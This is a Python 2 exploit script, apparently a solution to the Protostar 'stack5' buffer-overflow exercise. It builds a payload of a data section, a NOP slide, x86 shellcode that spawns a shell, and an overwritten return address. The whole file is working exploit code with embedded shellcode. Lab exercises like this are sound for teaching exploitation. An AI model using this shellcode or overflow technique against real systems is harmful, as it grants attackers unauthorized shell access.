#!/usr/bin/python2.6

# ############################################################################################## #
# We will generate the following C code:
# 
# char *argv[] = {"/bin/bash", NULL};
# execv(argv[0], argv);
# 
# An equivalent custom assembly can be seen in custom-shellcode.c
# Also a payload taken from shell-storm.org was tested (http://shell-storm.org/shellcode/files/shellcode-811.php)
# It was: Linux x86 execve("/bin/sh") - 28 bytes, by Jean Pascal Pereira
# 
# ############################################################################################## #

import struct

PAYLOAD_VERSION="CUSTOM"
# PAYLOAD_VERSION="JEAN_PASCAL_PEREIRA"

# DEBUG=True
DEBUG=False

payload_size = 0x48    # == 72. 0x48 from start of buffer until old ebp (exclusive)
payload_size += 0x8    # We will overwrite both old ebp and ret address 

# Address of the vulnerable buffer, where we place our shellcode. The address can vary based on the environment variables and program arguments
if DEBUG:
    buffer_address = 0xbffff770 # user@protostar:/opt/protostar/bin$ gdb stack5
else:
    buffer_address = 0xbffffdf0 # Found when the environment was empty and with full path to binary, i.e. /opt/.../stack5.

# 1 string literals
data_section = "/bin/dash\0\0" # Two NULL bytes so that the total size is not equal to 0xa == '\n'

# Array of pointers. NULL terminated
data_section += struct.pack("P", buffer_address) # Pointer to "/bin/bash" string
data_section += struct.pack("P", 0x00000000) # NULL

# instructions
text_section = ""
if DEBUG:
    text_section += "\xCC" # Will cause debuggers to stop

if PAYLOAD_VERSION == "CUSTOM":
    text_section += "\x89\xe3"
    text_section += "\x83\xeb\x50"
    text_section += "\x89\xd8"
    text_section += "\x83\xc0\x0b"
    text_section += "\x50"
    text_section += "\x53"
    text_section += "\xb8\xc0\xe2\xf2\xb7"
    text_section += "\xff\xd0"
elif PAYLOAD_VERSION == "JEAN_PASCAL_PEREIRA":
    text_section += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
else:
    assert(False)


# Available space for "nop" slide
nop_bytes = payload_size-len(data_section)-len(text_section)-0x8
assert(nop_bytes>0)
nop_slide = "\x90"*nop_bytes    # Each nop instruction is a single byte

ebp = struct.pack("P", 0x00000000)
eip = struct.pack("P", (buffer_address+len(data_section)+len(nop_slide)/2)) # Return address == Address of buffer + bytes until we reach the text segment + middle of nop slide
payload = data_section+nop_slide+text_section+ebp+eip

print(payload)
